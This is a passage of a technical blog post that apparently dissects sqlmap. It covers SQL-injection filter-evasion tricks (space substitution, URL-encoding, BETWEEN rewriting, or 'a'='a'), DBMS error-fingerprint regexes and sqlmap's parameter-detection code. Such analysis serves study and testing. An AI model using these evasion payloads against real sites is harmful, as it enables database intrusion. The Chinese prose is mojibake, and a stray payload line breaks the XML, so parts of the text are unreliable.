sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span><span class="hljs-operator">+</span>id<span class="hljs-operator">+</span><span class="hljs-keyword">FROM</span><span class="hljs-operator">+</span>users<br></code></pre></td></tr></table></figure><h3 id="éšæœºç©ºæ ¼æ›¿æ¢"><a href="#éšæœºç©ºæ ¼æ›¿æ¢" class="headerlink" title="éšæœºç©ºæ ¼æ›¿æ¢"></a>éšæœºç©ºæ ¼æ›¿æ¢</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span>\rid\tFROM\nusers<br></code></pre></td></tr></table></figure><table><thead><tr><th>æ•°æ®åº“</th><th>æ˜¯å¦æ”¯æŒ</th></tr></thead><tbody><tr><td>MSSQL</td><td>æ”¯æŒ</td></tr><tr><td>Mysql</td><td>æ”¯æŒ</td></tr><tr><td>PostgreSQL</td><td>æ”¯æŒ</td></tr><tr><td>Oracle</td><td>æ”¯æŒ</td></tr></tbody></table><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">$echo -e &quot;select\t*from\tv\$version;&quot;| sqlplus &quot;/ as sysdba&quot;<br><br>SQL&gt; <br><span class="hljs-section">BANNER</span><br><span class="hljs-section">----------------------------------------------------------------</span><br>Oracle Database 10g Enterprise Edition Release 10.1.0.3.0 - Prod<br>PL/SQL Release 10.1.0.3.0 - Production<br>CORE10.1.0.3.0Production<br>TNS for Linux: Version 10.1.0.3.0 - Production<br>NLSRTL Version 10.1.0.3.0 - Production<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">echo -e &quot;select\tversion();&quot; | psql -U postgres<br><span class="hljs-section">                                                               version                                                                </span><br><span class="hljs-section">--------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="hljs-code"> PostgreSQL 8.1.4 on i686-pc-linux-gnu, compiled by GCC i686-pc-linux-gnu-gcc (GCC) 3.4.6 (Gentoo 3.4.6-r1, ssp-3.4.5-1.0, pie-8.7.9)</span><br></code></pre></td></tr></table></figure><h3 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> FIELD <span class="hljs-keyword">FROM</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">TABLE</span><span class="hljs-string">&#x27; =&gt; &#x27;</span><span class="hljs-operator">%</span><span class="hljs-number">53</span><span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>c<span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-operator">%</span><span class="hljs-number">43</span><span class="hljs-operator">%</span><span class="hljs-number">54</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">46</span><span class="hljs-operator">%</span><span class="hljs-number">49</span><span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>c<span class="hljs-operator">%</span><span class="hljs-number">44</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">46</span><span class="hljs-operator">%</span><span class="hljs-number">52</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>f<span class="hljs-operator">%</span><span class="hljs-number">4</span>d<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">54</span><span class="hljs-operator">%</span><span class="hljs-number">41</span><span class="hljs-operator">%</span><span class="hljs-number">42</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>c<span class="hljs-operator">%</span><span class="hljs-number">45</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="between-æ›¿æ¢"><a href="#between-æ›¿æ¢" class="headerlink" title="between æ›¿æ¢"></a>between æ›¿æ¢</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">A <span class="hljs-operator">&gt;</span> B<span class="hljs-string">&#x27; =&gt; &#x27;</span>A <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">0</span> <span class="hljs-keyword">AND</span> B<br></code></pre></td></tr></table></figure><h3 id="é€ƒé¿æ­£åˆ™è¡¨è¾¾å¼æ£€æµ‹"><a href="#é€ƒé¿æ­£åˆ™è¡¨è¾¾å¼æ£€æµ‹" class="headerlink" title="é€ƒé¿æ­£åˆ™è¡¨è¾¾å¼æ£€æµ‹"></a>é€ƒé¿æ­£åˆ™è¡¨è¾¾å¼æ£€æµ‹</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>  ä½¿ç”¨  <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;a&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="DBMSåˆ†ææŠ€æœ¯"><a href="#DBMSåˆ†ææŠ€æœ¯" class="headerlink" title="DBMSåˆ†ææŠ€æœ¯"></a>DBMSåˆ†ææŠ€æœ¯</h2><h3 id="é€šè¿‡é”™è¯¯ä¿¡æ¯åˆ†æDBMS"><a href="#é€šè¿‡é”™è¯¯ä¿¡æ¯åˆ†æDBMS" class="headerlink" title="é€šè¿‡é”™è¯¯ä¿¡æ¯åˆ†æDBMS"></a>é€šè¿‡é”™è¯¯ä¿¡æ¯åˆ†æDBMS</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- MySQL --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;MySQL&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQL syntax.*MySQL&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*mysql_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;valid MySQL result&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;MySqlClient\.&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- PostgreSQL --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;PostgreSQL&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;PostgreSQL.*ERROR&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*\Wpg_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;valid PostgreSQL result&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Npgsql\.&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Microsoft SQL Server --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Microsoft SQL Server&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Driver.* SQL[\-\_\ ]*Server&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;OLE DB.* SQL Server&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;(\W|\A)SQL Server.*Driver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*mssql_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;(\W|\A)SQL Server.*[0-9a-fA-F]&#123;8&#125;&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Exception Details:.*\WSystem\.Data\.SqlClient\.&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Exception Details:.*\WRoadhouse\.Cms\.&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Microsoft Access --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Microsoft Access&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Microsoft Access Driver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;JET Database Engine&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Access Database Engine&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Oracle --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Oracle&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;ORA-[0-9][0-9][0-9][0-9]&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Oracle error&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Oracle.*Driver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*\Woci_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*\Wora_.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- DB2 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;DB2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;CLI Driver.*DB2&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;DB2 SQL error&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Informix --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Informix&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Exception.*Informix&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Interbase/Firebird --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Firebird&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Dynamic SQL Error&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*ibase_.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- SQLite --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;SQLite&quot;</span>&gt;</span>AND &#x27;[RANDSTR]&#x27;=&#x27;[RANDSTR]<br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQLite/JDBCDriver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQLite.Exception&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;System.Data.SQLite.SQLiteException&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*sqlite_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*SQLite3::&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- SAP MaxDB --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;SAP MaxDB&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQL error.*POS([0-9]+).*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*maxdb.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Sybase --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Sybase&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*sybase.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Sybase message&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Sybase.*Server message.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Ingres --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Ingres&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*ingres_&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Ingres SQLSTATE&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Ingres\W.*Driver&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ›´è¯¦ç»†åœ°éœ€è¦DBMS fingerprint è¯†åˆ«æŠ€æœ¯</p><h2 id="æ£€æµ‹SQL-Injection-çš„æŠ¥æ–‡"><a href="#æ£€æµ‹SQL-Injection-çš„æŠ¥æ–‡" class="headerlink" title="æ£€æµ‹SQL Injection çš„æŠ¥æ–‡"></a>æ£€æµ‹SQL Injection çš„æŠ¥æ–‡</h2><ol><li>æ£€æŸ¥å‚æ•°æ˜¯å¦åŠ¨æ€</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkDynParam</span>(<span class="hljs-params">place, parameter, value</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    This function checks if the url parameter is dynamic. If it is</span><br><span class="hljs-string">    dynamic, the content of the page differs, otherwise the</span><br><span class="hljs-string">    dynamicity might depend on another parameter.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    kb.matchRatio = <span class="hljs-literal">None</span><br><br>    infoMsg = <span class="hljs-string">&quot;testing if %s parameter &#x27;%s&#x27; is dynamic&quot;</span> % (place, parameter)<br>    logger.info(infoMsg)<br><br>    <span class="hljs-comment"># ç”Ÿæˆä¸€ä¸ªéšæœºå­—ç¬¦ä¸²</span><br>    randInt = randomInt()<br>    payload = agent.payload(place, parameter, value, getUnicode(randInt))<br>    logger.debug(<span class="hljs-string">&quot;checkDynParam: %s&quot;</span>, payload)<br>    dynResult = Request.queryPage(payload, place, raise404=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-comment"># å¦‚æœå’ŒåŸå…ˆé¡µé¢ä¸€æ ·ï¼Œä¸æ˜¯åŠ¨æ€å‚æ•°</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == dynResult:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    infoMsg = <span class="hljs-string">&quot;confirming that %s parameter &#x27;%s&#x27; is dynamic&quot;</span> % (place, parameter)<br>    logger.info(infoMsg)<br>    <span class="hljs-comment"># å†æ¬¡æ£€æŸ¥ï¼Œç¡®è®¤</span><br>    randInt = randomInt()<br>    payload = agent.payload(place, parameter, value, getUnicode(randInt))<br>    dynResult = Request.queryPage(payload, place, raise404=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> dynResult<br></code></pre></td></tr></table></figure><ol start="2"><li><p>å¯å‘å¼æ£€æµ‹ï¼Œé•¿åº¦ä¸º10çš„ â€œ,â€™, ), ( éšæœºå­—ç¬¦ä¸²ï¼Œ ä½¿ç”¨python RandomStr, å¦‚æœå‘ç”Ÿå·²çŸ¥é”™è¯¯ï¼ŒæŠ¥å¯èƒ½å­˜åœ¨sql injectionï¼Œ å¯èƒ½çš„æ•°æ®åº“</p></li><li><p>åŸºäºrisk å’Œ levelçš„çº§åˆ«ï¼Œä½¿ç”¨payloads.xmlä¸­çš„æŠ¥æ–‡è¿›è¡Œæ£€æµ‹</p></li><li><p>åˆ¤æ–­urlè¿æ¥æ˜¯å¦ç¨³å®šï¼Œè¿ç»­è¿æ¥urlä¸¤æ¬¡ï¼Œå¦‚æœè¿”å›å†…å®¹å®Œå…¨ç›¸åŒï¼Œåˆ™è®¤ä¸ºurlç¨³å®šã€‚</p></li><li><p>NullConnection <a href="http://www.wisec.it/sectou.php?id=472f952d79293">http://www.wisec.it/sectou.php?id=472f952d79293</a></p></li></ol><h2 id="æ€ä¹ˆåˆ¤æ–­injected-payload-æˆåŠŸ"><a href="#æ€ä¹ˆåˆ¤æ–­injected-payload-æˆåŠŸ" class="headerlink" title="æ€ä¹ˆåˆ¤æ–­injected payload æˆåŠŸ"></a>æ€ä¹ˆåˆ¤æ–­injected payload æˆåŠŸ</h2><h3 id="comparison-ç®—æ³•ï¼Œ-boolean-based-blind-SQL-injections"><a href="#comparison-ç®—æ³•ï¼Œ-boolean-based-blind-SQL-injections" class="headerlink" title="comparison ç®—æ³•ï¼Œ boolean-based blind SQL injections"></a>comparison ç®—æ³•ï¼Œ boolean-based blind SQL injections</h3><p>ä½¿ç”¨ difflib.SequenceMatcher, åŸºäºé¡µé¢ç›¸ä¼¼åº¦å¦‚æœè¯·æ±‚å‘ç”Ÿé”™è¯¯ï¼Œæ‰€æœ‰ä¸æ­£ç¡®çš„è¯·æ±‚éƒ½è®¤ä¸ºæ­£ç¡®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">comparison</span>(<span class="hljs-params">page, getRatioValue=<span class="hljs-literal">False</span>, pageLength=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> page <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> pageLength <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    regExpResults = <span class="hljs-literal">None</span><br><br>    seqMatcher = getCurrentThreadData().seqMatcher<br>    <span class="hljs-comment">#logger.debug(kb.pageTemplate)</span><br>    